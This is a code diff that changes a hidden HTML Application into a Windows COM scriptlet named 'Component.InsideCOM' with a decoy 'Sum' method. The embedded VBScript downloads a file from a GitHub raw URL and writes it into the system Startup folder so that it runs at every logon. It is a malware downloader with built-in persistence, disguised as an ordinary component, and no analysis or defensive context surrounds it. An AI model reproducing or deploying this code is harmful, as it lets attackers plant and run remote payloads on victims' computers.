@@ -1,10 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<title>Drel</title>
-<HTA:APPLICATION id="drel" APPLICATIONNAME="drl" WINDOWSTATE="minimize" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" CAPTION="no" SHOWINTASKBAR="no" />
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Component"
+    progid="Component.InsideCOM"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-000000000001}"
+>
+</registration>
+
+<public>
+    <method name="Sum">
+        <PARAMETER name="X"/>
+        <PARAMETER name="Y"/>
+    </method>
+</public>
 <script language="VBScript">
-<!--
+<![CDATA[
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "https://raw.githubusercontent.com/edu999/k99/master/fg.txt", False
@@ -16,10 +28,8 @@ with bStrm
     .write xHttp.responseBody
     .savetofile "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup", 2 '//overwrite
 end with
--->
+
+]]>
 </script>
-</head>
-<body>
-<p>This is a paragraph.</p>
-</body>
-</html>
+
+</scriptlet>
